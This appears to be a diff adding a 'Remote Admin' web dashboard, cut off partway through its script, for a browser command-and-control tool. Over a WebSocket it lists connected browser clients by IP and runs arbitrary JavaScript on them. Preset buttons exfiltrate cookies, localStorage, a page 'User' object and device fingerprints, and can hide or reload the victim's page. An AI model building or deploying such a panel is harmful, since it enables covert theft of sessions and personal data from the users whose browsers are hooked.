@@ -1,0 +1,1436 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Admin Dashboard</title>
+<style>
+    :root {
+        --bg-primary: #0a0e17;
+        --bg-secondary: #111827;
+        --bg-tertiary: #1a2332;
+        --bg-card: #151f2e;
+        --border: #1e3a5f;
+        --border-glow: #3b82f6;
+        --text-primary: #e2e8f0;
+        --text-secondary: #94a3b8;
+        --text-muted: #64748b;
+        --accent: #3b82f6;
+        --accent-hover: #2563eb;
+        --green: #22c55e;
+        --green-dim: #15803d;
+        --red: #ef4444;
+        --red-dim: #991b1b;
+        --yellow: #eab308;
+        --yellow-dim: #854d0e;
+        --purple: #a855f7;
+        --cyan: #06b6d4;
+    }
+
+    * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+    }
+
+    body {
+        font-family: 'SF Mono', 'Fira Code', 'Cascadia Code', 'JetBrains Mono', monospace;
+        background: var(--bg-primary);
+        color: var(--text-primary);
+        min-height: 100vh;
+        overflow-x: hidden;
+    }
+
+    /* Scrollbar */
+    ::-webkit-scrollbar { width: 6px; height: 6px; }
+    ::-webkit-scrollbar-track { background: var(--bg-secondary); }
+    ::-webkit-scrollbar-thumb { background: var(--border); border-radius: 3px; }
+    ::-webkit-scrollbar-thumb:hover { background: var(--accent); }
+
+    /* Header */
+    .header {
+        background: linear-gradient(135deg, var(--bg-secondary), var(--bg-tertiary));
+        border-bottom: 1px solid var(--border);
+        padding: 16px 24px;
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        position: sticky;
+        top: 0;
+        z-index: 100;
+        backdrop-filter: blur(12px);
+    }
+
+    .header-left {
+        display: flex;
+        align-items: center;
+        gap: 16px;
+    }
+
+    .logo {
+        font-size: 20px;
+        font-weight: 700;
+        background: linear-gradient(135deg, var(--accent), var(--cyan));
+        -webkit-background-clip: text;
+        -webkit-text-fill-color: transparent;
+        letter-spacing: 1px;
+    }
+
+    .status-badge {
+        display: flex;
+        align-items: center;
+        gap: 8px;
+        padding: 4px 12px;
+        border-radius: 20px;
+        font-size: 12px;
+        font-weight: 600;
+    }
+
+    .status-badge.connected {
+        background: rgba(34, 197, 94, 0.15);
+        color: var(--green);
+        border: 1px solid rgba(34, 197, 94, 0.3);
+    }
+
+    .status-badge.disconnected {
+        background: rgba(239, 68, 68, 0.15);
+        color: var(--red);
+        border: 1px solid rgba(239, 68, 68, 0.3);
+    }
+
+    .status-dot {
+        width: 8px;
+        height: 8px;
+        border-radius: 50%;
+        animation: pulse 2s infinite;
+    }
+
+    .connected .status-dot { background: var(--green); }
+    .disconnected .status-dot { background: var(--red); }
+
+    @keyframes pulse {
+        0%, 100% { opacity: 1; }
+        50% { opacity: 0.4; }
+    }
+
+    .header-stats {
+        display: flex;
+        gap: 20px;
+    }
+
+    .stat-item {
+        text-align: center;
+    }
+
+    .stat-value {
+        font-size: 22px;
+        font-weight: 700;
+        color: var(--accent);
+    }
+
+    .stat-label {
+        font-size: 10px;
+        color: var(--text-muted);
+        text-transform: uppercase;
+        letter-spacing: 1px;
+    }
+
+    /* Main Layout */
+    .main-container {
+        display: grid;
+        grid-template-columns: 340px 1fr 380px;
+        grid-template-rows: auto 1fr;
+        gap: 0;
+        height: calc(100vh - 65px);
+    }
+
+    /* Panels */
+    .panel {
+        border-right: 1px solid var(--border);
+        display: flex;
+        flex-direction: column;
+        overflow: hidden;
+    }
+
+    .panel:last-child { border-right: none; }
+
+    .panel-header {
+        padding: 12px 16px;
+        background: var(--bg-secondary);
+        border-bottom: 1px solid var(--border);
+        font-size: 12px;
+        font-weight: 700;
+        text-transform: uppercase;
+        letter-spacing: 1.5px;
+        color: var(--text-secondary);
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        flex-shrink: 0;
+    }
+
+    .panel-header .count {
+        background: var(--accent);
+        color: white;
+        padding: 2px 8px;
+        border-radius: 10px;
+        font-size: 11px;
+    }
+
+    .panel-body {
+        flex: 1;
+        overflow-y: auto;
+        padding: 8px;
+    }
+
+    /* Client Cards */
+    .client-card {
+        background: var(--bg-card);
+        border: 1px solid var(--border);
+        border-radius: 8px;
+        padding: 12px;
+        margin-bottom: 6px;
+        cursor: pointer;
+        transition: all 0.2s ease;
+        position: relative;
+    }
+
+    .client-card:hover {
+        border-color: var(--accent);
+        background: var(--bg-tertiary);
+        transform: translateX(2px);
+    }
+
+    .client-card.selected {
+        border-color: var(--accent);
+        box-shadow: 0 0 12px rgba(59, 130, 246, 0.2);
+    }
+
+    .client-card.new-data {
+        animation: flashBorder 0.5s ease;
+    }
+
+    @keyframes flashBorder {
+        0%, 100% { border-color: var(--border); }
+        50% { border-color: var(--green); box-shadow: 0 0 10px rgba(34, 197, 94, 0.3); }
+    }
+
+    .client-id {
+        font-weight: 700;
+        color: var(--cyan);
+        font-size: 13px;
+    }
+
+    .client-ip {
+        color: var(--text-muted);
+        font-size: 11px;
+        margin-top: 2px;
+    }
+
+    .client-meta {
+        display: flex;
+        gap: 8px;
+        margin-top: 6px;
+        flex-wrap: wrap;
+    }
+
+    .meta-tag {
+        font-size: 10px;
+        padding: 2px 6px;
+        border-radius: 4px;
+        background: rgba(59, 130, 246, 0.1);
+        color: var(--accent);
+        border: 1px solid rgba(59, 130, 246, 0.2);
+    }
+
+    .meta-tag.green {
+        background: rgba(34, 197, 94, 0.1);
+        color: var(--green);
+        border-color: rgba(34, 197, 94, 0.2);
+    }
+
+    .meta-tag.yellow {
+        background: rgba(234, 179, 8, 0.1);
+        color: var(--yellow);
+        border-color: rgba(234, 179, 8, 0.2);
+    }
+
+    .client-username {
+        color: var(--green);
+        font-weight: 600;
+        font-size: 14px;
+        margin-top: 4px;
+    }
+
+    /* Center Panel */
+    .center-panel {
+        display: flex;
+        flex-direction: column;
+        overflow: hidden;
+    }
+
+    /* Command Bar */
+    .command-section {
+        padding: 16px;
+        background: var(--bg-secondary);
+        border-bottom: 1px solid var(--border);
+        flex-shrink: 0;
+    }
+
+    .command-bar {
+        display: flex;
+        gap: 8px;
+    }
+
+    .command-input {
+        flex: 1;
+        background: var(--bg-primary);
+        border: 1px solid var(--border);
+        color: var(--text-primary);
+        padding: 10px 14px;
+        border-radius: 6px;
+        font-family: inherit;
+        font-size: 13px;
+        outline: none;
+        transition: border-color 0.2s;
+    }
+
+    .command-input:focus {
+        border-color: var(--accent);
+        box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.1);
+    }
+
+    .command-input::placeholder {
+        color: var(--text-muted);
+    }
+
+    .btn {
+        padding: 10px 18px;
+        border-radius: 6px;
+        border: 1px solid var(--border);
+        background: var(--bg-tertiary);
+        color: var(--text-primary);
+        font-family: inherit;
+        font-size: 12px;
+        font-weight: 600;
+        cursor: pointer;
+        transition: all 0.2s;
+        white-space: nowrap;
+    }
+
+    .btn:hover {
+        background: var(--bg-card);
+        border-color: var(--accent);
+    }
+
+    .btn-primary {
+        background: var(--accent);
+        border-color: var(--accent);
+        color: white;
+    }
+
+    .btn-primary:hover {
+        background: var(--accent-hover);
+    }
+
+    .btn-danger {
+        border-color: var(--red-dim);
+        color: var(--red);
+    }
+
+    .btn-danger:hover {
+        background: var(--red-dim);
+        color: white;
+    }
+
+    .btn-green {
+        border-color: var(--green-dim);
+        color: var(--green);
+    }
+
+    .btn-green:hover {
+        background: var(--green-dim);
+        color: white;
+    }
+
+    .target-indicator {
+        font-size: 11px;
+        color: var(--text-muted);
+        margin-top: 8px;
+        display: flex;
+        align-items: center;
+        gap: 6px;
+    }
+
+    .target-indicator .target-name {
+        color: var(--cyan);
+        font-weight: 600;
+    }
+
+    .btn-clear-target {
+        color: var(--red);
+        cursor: pointer;
+        text-decoration: underline;
+        background: none;
+        border: none;
+        font-family: inherit;
+        font-size: 11px;
+    }
+
+    /* Quick Actions */
+    .quick-actions {
+        padding: 8px 16px;
+        background: var(--bg-secondary);
+        border-bottom: 1px solid var(--border);
+        display: flex;
+        gap: 6px;
+        flex-wrap: wrap;
+        flex-shrink: 0;
+    }
+
+    .quick-btn {
+        padding: 5px 10px;
+        border-radius: 4px;
+        border: 1px solid var(--border);
+        background: var(--bg-primary);
+        color: var(--text-secondary);
+        font-family: inherit;
+        font-size: 11px;
+        cursor: pointer;
+        transition: all 0.15s;
+    }
+
+    .quick-btn:hover {
+        border-color: var(--accent);
+        color: var(--accent);
+        background: rgba(59, 130, 246, 0.05);
+    }
+
+    /* Detail View */
+    .detail-view {
+        flex: 1;
+        overflow-y: auto;
+        padding: 16px;
+    }
+
+    .detail-section {
+        margin-bottom: 16px;
+    }
+
+    .detail-title {
+        font-size: 11px;
+        text-transform: uppercase;
+        letter-spacing: 1px;
+        color: var(--text-muted);
+        margin-bottom: 8px;
+        padding-bottom: 4px;
+        border-bottom: 1px solid var(--border);
+    }
+
+    .detail-grid {
+        display: grid;
+        grid-template-columns: 1fr 1fr;
+        gap: 8px;
+    }
+
+    .detail-item {
+        background: var(--bg-card);
+        border: 1px solid var(--border);
+        border-radius: 6px;
+        padding: 10px;
+    }
+
+    .detail-item-label {
+        font-size: 10px;
+        color: var(--text-muted);
+        text-transform: uppercase;
+        letter-spacing: 0.5px;
+    }
+
+    .detail-item-value {
+        font-size: 13px;
+        color: var(--text-primary);
+        margin-top: 2px;
+        word-break: break-all;
+    }
+
+    .detail-item-full {
+        grid-column: 1 / -1;
+    }
+
+    /* JSON Viewer */
+    .json-viewer {
+        background: var(--bg-primary);
+        border: 1px solid var(--border);
+        border-radius: 6px;
+        padding: 12px;
+        font-size: 12px;
+        line-height: 1.6;
+        overflow-x: auto;
+        white-space: pre-wrap;
+        word-break: break-all;
+        max-height: 400px;
+        overflow-y: auto;
+    }
+
+    .json-key { color: var(--cyan); }
+    .json-string { color: var(--green); }
+    .json-number { color: var(--yellow); }
+    .json-boolean { color: var(--purple); }
+    .json-null { color: var(--text-muted); }
+
+    /* Live Feed */
+    .feed-entry {
+        padding: 8px 12px;
+        border-bottom: 1px solid rgba(30, 58, 95, 0.3);
+        font-size: 12px;
+        transition: background 0.2s;
+    }
+
+    .feed-entry:hover {
+        background: rgba(59, 130, 246, 0.03);
+    }
+
+    .feed-entry.new {
+        animation: feedFlash 0.8s ease;
+    }
+
+    @keyframes feedFlash {
+        0% { background: rgba(59, 130, 246, 0.15); }
+        100% { background: transparent; }
+    }
+
+    .feed-time {
+        color: var(--text-muted);
+        font-size: 10px;
+    }
+
+    .feed-client {
+        color: var(--cyan);
+        font-weight: 600;
+    }
+
+    .feed-type {
+        display: inline-block;
+        padding: 1px 6px;
+        border-radius: 3px;
+        font-size: 10px;
+        font-weight: 600;
+        margin-left: 4px;
+    }
+
+    .feed-type.connect {
+        background: rgba(34, 197, 94, 0.15);
+        color: var(--green);
+    }
+
+    .feed-type.disconnect {
+        background: rgba(239, 68, 68, 0.15);
+        color: var(--red);
+    }
+
+    .feed-type.message {
+        background: rgba(59, 130, 246, 0.15);
+        color: var(--accent);
+    }
+
+    .feed-type.command {
+        background: rgba(168, 85, 247, 0.15);
+        color: var(--purple);
+    }
+
+    .feed-content {
+        color: var(--text-secondary);
+        margin-top: 4px;
+        font-size: 11px;
+        word-break: break-all;
+        max-height: 60px;
+        overflow: hidden;
+    }
+
+    /* No Selection State */
+    .no-selection {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+        height: 100%;
+        color: var(--text-muted);
+        text-align: center;
+        padding: 40px;
+    }
+
+    .no-selection-icon {
+        font-size: 48px;
+        margin-bottom: 16px;
+        opacity: 0.3;
+    }
+
+    .no-selection h3 {
+        font-size: 16px;
+        margin-bottom: 8px;
+        color: var(--text-secondary);
+    }
+
+    .no-selection p {
+        font-size: 13px;
+        line-height: 1.6;
+    }
+
+    /* Empty state */
+    .empty-state {
+        text-align: center;
+        padding: 40px 20px;
+        color: var(--text-muted);
+    }
+
+    .empty-state-icon {
+        font-size: 36px;
+        opacity: 0.3;
+        margin-bottom: 12px;
+    }
+
+    /* Tabs */
+    .tabs {
+        display: flex;
+        border-bottom: 1px solid var(--border);
+        background: var(--bg-secondary);
+        flex-shrink: 0;
+    }
+
+    .tab {
+        padding: 10px 16px;
+        font-size: 12px;
+        font-weight: 600;
+        color: var(--text-muted);
+        cursor: pointer;
+        border-bottom: 2px solid transparent;
+        transition: all 0.2s;
+        font-family: inherit;
+        background: none;
+        border-top: none;
+        border-left: none;
+        border-right: none;
+    }
+
+    .tab:hover { color: var(--text-secondary); }
+    .tab.active {
+        color: var(--accent);
+        border-bottom-color: var(--accent);
+    }
+
+    /* Responsive */
+    @media (max-width: 1100px) {
+        .main-container {
+            grid-template-columns: 280px 1fr;
+        }
+        .right-panel { display: none; }
+    }
+
+    @media (max-width: 768px) {
+        .main-container {
+            grid-template-columns: 1fr;
+        }
+    }
+
+    /* Toast */
+    .toast-container {
+        position: fixed;
+        top: 80px;
+        right: 20px;
+        z-index: 1000;
+        display: flex;
+        flex-direction: column;
+        gap: 8px;
+    }
+
+    .toast {
+        background: var(--bg-card);
+        border: 1px solid var(--border);
+        border-radius: 8px;
+        padding: 12px 16px;
+        font-size: 12px;
+        min-width: 250px;
+        box-shadow: 0 8px 24px rgba(0, 0, 0, 0.4);
+        animation: slideIn 0.3s ease;
+        display: flex;
+        align-items: center;
+        gap: 10px;
+    }
+
+    .toast.success { border-left: 3px solid var(--green); }
+    .toast.error { border-left: 3px solid var(--red); }
+    .toast.info { border-left: 3px solid var(--accent); }
+
+    @keyframes slideIn {
+        from { transform: translateX(100%); opacity: 0; }
+        to { transform: translateX(0); opacity: 1; }
+    }
+
+    /* Multi-line command */
+    .command-textarea {
+        width: 100%;
+        min-height: 80px;
+        max-height: 200px;
+        background: var(--bg-primary);
+        border: 1px solid var(--border);
+        color: var(--text-primary);
+        padding: 10px 14px;
+        border-radius: 6px;
+        font-family: inherit;
+        font-size: 13px;
+        outline: none;
+        resize: vertical;
+        transition: border-color 0.2s;
+    }
+
+    .command-textarea:focus {
+        border-color: var(--accent);
+        box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.1);
+    }
+
+    .mode-toggle {
+        display: flex;
+        gap: 4px;
+        background: var(--bg-primary);
+        border-radius: 6px;
+        padding: 3px;
+        border: 1px solid var(--border);
+    }
+
+    .mode-toggle button {
+        padding: 4px 10px;
+        border-radius: 4px;
+        border: none;
+        background: transparent;
+        color: var(--text-muted);
+        font-family: inherit;
+        font-size: 11px;
+        cursor: pointer;
+        transition: all 0.15s;
+    }
+
+    .mode-toggle button.active {
+        background: var(--accent);
+        color: white;
+    }
+
+    /* User data display cards */
+    .user-field {
+        display: flex;
+        justify-content: space-between;
+        padding: 6px 0;
+        border-bottom: 1px solid rgba(30, 58, 95, 0.3);
+        font-size: 12px;
+    }
+
+    .user-field:last-child { border-bottom: none; }
+
+    .user-field-key {
+        color: var(--text-muted);
+        flex-shrink: 0;
+        margin-right: 12px;
+    }
+
+    .user-field-value {
+        color: var(--text-primary);
+        text-align: right;
+        word-break: break-all;
+    }
+</style>
+</head>
+<body>
+
+<div class="header">
+    <div class="header-left">
+        <div class="logo">⌘ REMOTE ADMIN</div>
+        <div id="wsStatus" class="status-badge disconnected">
+            <span class="status-dot"></span>
+            <span id="wsStatusText">Connecting...</span>
+        </div>
+    </div>
+    <div class="header-stats">
+        <div class="stat-item">
+            <div class="stat-value" id="totalClients">0</div>
+            <div class="stat-label">Clients</div>
+        </div>
+        <div class="stat-item">
+            <div class="stat-value" id="totalMessages">0</div>
+            <div class="stat-label">Messages</div>
+        </div>
+        <div class="stat-item">
+            <div class="stat-value" id="totalCommands">0</div>
+            <div class="stat-label">Commands</div>
+        </div>
+    </div>
+</div>
+
+<div class="main-container">
+    <!-- Left Panel: Client List -->
+    <div class="panel">
+        <div class="panel-header">
+            <span>Connected Clients</span>
+            <span class="count" id="clientCount">0</span>
+        </div>
+        <div style="padding: 8px; flex-shrink: 0; border-bottom: 1px solid var(--border);">
+            <input type="text" class="command-input" id="clientSearch" placeholder="Search clients..." style="width: 100%; padding: 7px 10px; font-size: 12px;">
+        </div>
+        <div class="panel-body" id="clientList">
+            <div class="empty-state">
+                <div class="empty-state-icon">📡</div>
+                <p>Waiting for connections...</p>
+            </div>
+        </div>
+    </div>
+
+    <!-- Center Panel: Command & Detail -->
+    <div class="center-panel">
+        <div class="command-section">
+            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px;">
+                <div class="mode-toggle">
+                    <button class="active" onclick="setInputMode('single')">Single Line</button>
+                    <button onclick="setInputMode('multi')">Multi-Line</button>
+                </div>
+                <div style="display: flex; gap: 6px;">
+                    <button class="btn btn-green" onclick="requestAllUserInfo()">📋 Fetch All Users</button>
+                    <button class="btn" onclick="refreshClients()">🔄 Refresh</button>
+                </div>
+            </div>
+            <div id="singleLineInput">
+                <div class="command-bar">
+                    <input type="text" class="command-input" id="commandInput" placeholder="Enter JavaScript to execute on clients..." 
+                        onkeydown="if(event.key==='Enter')sendCommand()">
+                    <button class="btn btn-primary" onclick="sendCommand()">▶ Execute</button>
+                </div>
+            </div>
+            <div id="multiLineInput" style="display: none;">
+                <textarea class="command-textarea" id="commandTextarea" placeholder="Enter multi-line JavaScript..."></textarea>
+                <div style="margin-top: 8px; display: flex; gap: 8px; justify-content: flex-end;">
+                    <button class="btn btn-primary" onclick="sendCommand()">▶ Execute</button>
+                </div>
+            </div>
+            <div class="target-indicator" id="targetIndicator" style="display: none;">
+                Targeting: <span class="target-name" id="targetName"></span>
+                <button class="btn-clear-target" onclick="clearTarget()">✕ Clear (broadcast to all)</button>
+            </div>
+        </div>
+
+        <div class="quick-actions">
+            <button class="quick-btn" onclick="quickCommand('alert(\"Hello from admin\")')">Alert</button>
+            <button class="quick-btn" onclick="quickCommand('window.postMessage({ action: \"sendToWS\", message: JSON.stringify(typeof User !== \"undefined\" ? User : {error:\"No User\"}) }, \"*\")')">Get User</button>
+            <button class="quick-btn" onclick="quickCommand('window.postMessage({ action: \"sendToWS\", message: JSON.stringify({url:location.href,title:document.title,cookies:document.cookie}) }, \"*\")')">Page Info</button>
+            <button class="quick-btn" onclick="quickCommand('window.postMessage({ action: \"sendToWS\", message: JSON.stringify({localStorage:Object.fromEntries(Object.entries(localStorage))}) }, \"*\")')">LocalStorage</button>
+            <button class="quick-btn" onclick="quickCommand('window.postMessage({ action: \"sendToWS\", message: JSON.stringify({innerWidth,innerHeight,screen:{w:screen.width,h:screen.height},userAgent:navigator.userAgent,language:navigator.language,platform:navigator.platform}) }, \"*\")')">Device Info</button>
+            <button class="quick-btn" onclick="quickCommand('document.body.style.display=\"none\"')">Hide Page</button>
+            <button class="quick-btn" onclick="quickCommand('document.body.style.display=\"\"')">Show Page</button>
+            <button class="quick-btn" onclick="quickCommand('location.reload()')">Reload Page</button>
+        </div>
+
+        <!-- Tabs for center panel content -->
+        <div class="tabs">
+            <button class="tab active" onclick="switchTab('detail')">Client Detail</button>
+            <button class="tab" onclick="switchTab('data')">User Data</button>
+            <button class="tab" onclick="switchTab('history')">Command History</button>
+        </div>
+
+        <!-- Tab Content -->
+        <div class="detail-view" id="tabContent">
+            <div class="no-selection" id="noSelection">
+                <div class="no-selection-icon">👈</div>
+                <h3>Select a Client</h3>
+                <p>Click on a client in the left panel to view details, or use the command bar to broadcast to all connected clients.</p>
+            </div>
+            <div id="clientDetail" style="display: none;"></div>
+            <div id="userData" style="display: none;"></div>
+            <div id="commandHistory" style="display: none;"></div>
+        </div>
+    </div>
+
+    <!-- Right Panel: Live Feed -->
+    <div class="panel right-panel">
+        <div class="panel-header">
+            <span>Live Feed</span>
+            <button class="btn" style="padding: 3px 8px; font-size: 10px;" onclick="clearFeed()">Clear</button>
+        </div>
+        <div class="panel-body" id="liveFeed">
+            <div class="empty-state">
+                <div class="empty-state-icon">📡</div>
+                <p>Waiting for activity...</p>
+            </div>
+        </div>
+    </div>
+</div>
+
+<div class="toast-container" id="toastContainer"></div>
+
+<script>
+    // State
+    let ws = null;
+    let clientsMap = {}; // id -> client info
+    let selectedClientId = null;
+    let targetClientId = null; // null = broadcast to all
+    let commandHistoryList = [];
+    let messageCount = 0;
+    let commandCount = 0;
+    let inputMode = 'single';
+    let currentTab = 'detail';
+
+    // Connect admin WebSocket
+    function connectWS() {
+        const protocol = location.protocol === 'https:' ? 'wss:' : 'ws:';
+        //ws = new WebSocket(`${protocol}//${location.host}/?admin=true`);
+        ws = new WebSocket(`ws://localhost:8080/?admin=true`);
+
+        ws.onopen = () => {
+            document.getElementById('wsStatus').className = 'status-badge connected';
+            document.getElementById('wsStatusText').textContent = 'Connected';
+            showToast('Connected to server', 'success');
+        };
+
+        ws.onclose = () => {
+            document.getElementById('wsStatus').className = 'status-badge disconnected';
+            document.getElementById('wsStatusText').textContent = 'Disconnected';
+            showToast('Disconnected. Reconnecting...', 'error');
+            setTimeout(connectWS, 3000);
+        };
+
+        ws.onerror = () => {
+            ws.close();
+        };
+
+        ws.onmessage = (event) => {
+            try {
+                const data = JSON.parse(event.data);
+                handleWSMessage(data);
+            } catch (e) {
+                console.error('Failed to parse WS message:', e);
+            }
+        };
+    }
+
+    function handleWSMessage(data) {
+        switch (data.type) {
+            case 'init':
+                // Initial state
+                data.clients.forEach(c => {
+                    clientsMap[c.id] = c;
+                });
+                commandHistoryList = data.commandHistory || [];
+                commandCount = commandHistoryList.length;
+                data.messageLog?.forEach(m => messageCount++);
+                renderClientList();
+                updateStats();
+                break;
+
+            case 'client_connected':
+                clientsMap[data.client.id] = data.client;
+                renderClientList();
+                addFeedEntry('connect', `Client #${data.client.id}`, `Connected from ${data.client.ip}`);
+                updateStats();
+                break;
+
+            case 'client_disconnected':
+                delete clientsMap[data.clientId];
+                if (selectedClientId === data.clientId) {
+                    selectedClientId = null;
+                    showNoSelection();
+                }
+                renderClientList();
+                addFeedEntry('disconnect', `Client #${data.clientId}`, 'Disconnected');
+                updateStats();
+                break;
+
+            case 'client_message':
+                messageCount++;
+                if (clientsMap[data.clientId]) {
+                    clientsMap[data.clientId].lastSeen = data.timestamp;
+                    clientsMap[data.clientId].messageCount = (clientsMap[data.clientId].messageCount || 0) + 1;
+
+                    // Store user data if it's an object
+                    if (typeof data.data === 'object' && data.data !== null) {
+                        clientsMap[data.clientId].userData = {
+                            data: data.data,
+                            receivedAt: data.timestamp
+                        };
+                    }
+
+                    // Flash the card
+                    const card = document.querySelector(`[data-client-id="${data.clientId}"]`);
+                    if (card) {
+                        card.classList.remove('new-data');
+                        void card.offsetWidth;
+                        card.classList.add('new-data');
+                    }
+                }
+
+                const preview = typeof data.data === 'object' ? JSON.stringify(data.data).substring(0, 100) : String(data.data).substring(0, 100);
+                addFeedEntry('message', `Client #${data.clientId}`, preview);
+
+                // Update detail if this client is selected
+                if (selectedClientId === data.clientId) {
+                    renderDetail();
+                }
+
+                updateStats();
+                break;
+
+            case 'command_sent':
+                commandCount++;
+                commandHistoryList.push(data);
+                addFeedEntry('command', 'Broadcast', `Sent to ${data.sentTo} clients: ${data.script.substring(0, 80)}`);
+                updateStats();
+                if (currentTab === 'history') renderCommandHistory();
+                break;
+        }
+    }
+
+    function renderClientList() {
+        const container = document.getElementById('clientList');
+        const search = document.getElementById('clientSearch').value.toLowerCase();
+        const ids = Object.keys(clientsMap).map(Number).sort((a, b) => b - a);
+        const filtered = ids.filter(id => {
+            const c = clientsMap[id];
+            if (!search) return true;
+            const searchStr = `${c.id} ${c.ip} ${c.userAgent} ${c.origin} ${JSON.stringify(c.userData?.data || '')}`.toLowerCase();
+            return searchStr.includes(search);
+        });
+
+        document.getElementById('clientCount').textContent = ids.length;
+        document.getElementById('totalClients').textContent = ids.length;
+
+        if (filtered.length === 0) {
+            container.innerHTML = `<div class="empty-state"><div class="empty-state-icon">📡</div><p>${ids.length === 0 ? 'Waiting for connections...' : 'No matches found'}</p></div>`;
+            return;
+        }
+
+        container.innerHTML = filtered.map(id => {
+            const c = clientsMap[id];
+            const userData = c.userData?.data;
+            let username = '';
+            if (userData) {
+                username = userData.username || userData.name || userData.displayName || userData.email || userData.nick || '';
+                // Try to find username in nested properties
+                if (!username && typeof userData === 'object') {
+                    for (const key of Object.keys(userData)) {
+                        if (typeof userData[key] === 'string' && (key.toLowerCase().includes('name') || key.toLowerCase().includes('user'))) {
+                            username = userData[key];
+                            break;
+                        }
+                    }
+                }
+            }
+
+            const age = timeSince(c.connectedAt);
+            const lastSeen = timeSince(c.lastSeen);
+            const isSelected = selectedClientId === id;
+            const isTarget = targetClientId === id;
+
+            return `
+                <div class="client-card ${isSelected ? 'selected' : ''}" data-client-id="${id}" onclick="selectClient(${id})">
+                    <div style="display: flex; justify-content: space-between; align-items: center;">
+                        <span class="client-id">#${id}</span>
+                        ${isTarget ? '<span class="meta-tag yellow">TARGET</span>' : ''}
+                    </div>
+                    ${username ? `<div class="client-username">${escapeHtml(username)}</div>` : ''}
+                    <div class="client-ip">${escapeHtml(c.ip || 'Unknown IP')}</div>
+                    <div class="client-meta">
+                        <span class="meta-tag green">↑${c.messageCount || 0} msgs</span>
+                        <span class="meta-tag">${age}</span>
+                        ${userData ? '<span class="meta-tag green">Has Data</span>' : ''}
+                    </div>
+                </div>
+            `;
+        }).join('');
+    }
+
+    function selectClient(id) {
+        selectedClientId = id;
+        renderClientList();
+        renderDetail();
+    }
+
+    function renderDetail() {
+        if (!selectedClientId || !clientsMap[selectedClientId]) {
+            showNoSelection();
+            return;
+        }
+
+        const c = clientsMap[selectedClientId];
+
+        if (currentTab === 'detail') {
+            showTab('clientDetail');
+            const container = document.getElementById('clientDetail');
+
+            let browserInfo = 'Unknown';
+            const ua = c.userAgent || '';
+            if (ua.includes('Chrome')) browserInfo = 'Chrome';
+            else if (ua.includes('Firefox')) browserInfo = 'Firefox';
+            else if (ua.includes('Safari')) browserInfo = 'Safari';
+            else if (ua.includes('Edge')) browserInfo = 'Edge';
+
+            container.innerHTML = `
+                <div class="detail-section">
+                    <div class="detail-title">Connection Info</div>
+                    <div class="detail-grid">
+                        <div class="detail-item">
+                            <div class="detail-item-label">Client ID</div>
+                            <div class="detail-item-value">#${c.id}</div>
+                        </div>
+                        <div class="detail-item">
+                            <div class="detail-item-label">IP Address</div>
+                            <div class="detail-item-value">${escapeHtml(c.ip || 'Unknown')}</div>
+                        </div>
+                        <div class="detail-item">
+                            <div class="detail-item-label">Connected At</div>
+                            <div class="detail-item-value">${new Date(c.connectedAt).toLocaleString()}</div>
+                        </div>
+                        <div class="detail-item">
+                            <div class="detail-item-label">Last Seen</div>
+                            <div class="detail-item-value">${timeSince(c.lastSeen)} ago</div>
+                        </div>
+                        <div class="detail-item">
+                            <div class="detail-item-label">Messages</div>
+                            <div class="detail-item-value">${c.messageCount || 0}</div>
+                        </div>
+                        <div class="detail-item">
+                            <div class="detail-item-label">Browser</div>
+                            <div class="detail-item-value">${browserInfo}</div>
+                        </div>
+                        <div class="detail-item detail-item-full">
+                            <div class="detail-item-label">Origin</div>
+                            <div class="detail-item-value">${escapeHtml(c.origin || 'Unknown')}</div>
+                        </div>
+                        <div class="detail-item detail-item-full">
+                            <div class="detail-item-label">User Agent</div>
+                            <div class="detail-item-value" style="font-size: 11px;">${escapeHtml(c.userAgent || 'Unknown')}</div>
+                        </div>
+                    </div>
+                </div>
+                <div style="display: flex; gap: 8px; flex-wrap: wrap; margin-bottom: 16px;">
+                    <button class="btn btn-primary" onclick="setTarget(${c.id})">🎯 Set as Target</button>
+                    <button class="btn btn-green" onclick="fetchUserData(${c.id})">📋 Fetch User Data</button>
+                    <button class="btn" onclick="fetchPageInfo(${c.id})">🌐 Page Info</button>
+                    <button class="btn" onclick="fetchDeviceInfo(${c.id})">💻 Device Info</button>
+                    <button class="btn btn-danger" onclick="sendToClient(${c.id}, 'location.reload()')">🔄 Reload</button>
+                </div>
+                ${c.userData ? `
+                    <div class="detail-section">
+                        <div class="detail-title">Latest User Data (received ${timeSince(c.userData.receivedAt)} ago)</div>
+                        <div class="json-viewer">${syntaxHighlight(JSON.stringify(c.userData.data, null, 2))}</div>
+                    </div>
+                ` : `
+                    <div class="detail-section">
+                        <div class="detail-title">User Data</div>
+                        <div style="color: var(--text-muted); font-size: 13px; padding: 20px; text-align: center;">
+                            No user data yet. Click "Fetch User Data" above.
+                        </div>
+                    </div>
+                `}
+            `;
+        } else if (currentTab === 'data') {
+            renderUserDataTab();
+        } else if (currentTab === 'history') {
+            renderCommandHistory();
+        }
+    }
+
+    function renderUserDataTab() {
+        showTab('userData');
+        const container = document.getElementById('userData');
+        const entries = Object.entries(clientsMap)
+            .filter(([id, c]) => c.userData)
+            .sort((a, b) => new Date(b[1].userData.receivedAt) - new Date(a[1].userData.receivedAt));
+
+        if (entries.length === 0) {
+            container.innerHTML = `
+                <div class="no-selection">
+                    <div class="no-selection-icon">📋</div>
+                    <h3>No User Data Yet</h3>
+                    <p>Click "Fetch All Users" to request user data from all connected clients.</p>
+                </div>
+            `;
+            return;
+        }
+
+        container.innerHTML = entries.map(([id, c]) => {
+            const d = c.userData.data;
+            return `
+                <div class="detail-section">
+                    <div class="detail-title" style="display: flex; justify-content: space-between; cursor: pointer;" onclick="selectClient(${id}); switchTab('detail');">
+                        <span>Client #${id} ${d.username || d.name || ''}</span>
+                        <span>${timeSince(c.userData.receivedAt)} ago</span>
+                    </div>
+                    <div class="json-viewer" style="max-height: 200px;">${syntaxHighlight(JSON.stringify(d, null, 2))}</div>
+                </div>
+            `;
+        }).join('');
+    }
+
+    function renderCommandHistory() {
+        showTab('commandHistory');
+        const container = document.getElementById('commandHistory');
+
+        if (commandHistoryList.length === 0) {
+            container.innerHTML = `
+                <div class="no-selection">
+                    <div class="no-selection-icon">📜</div>
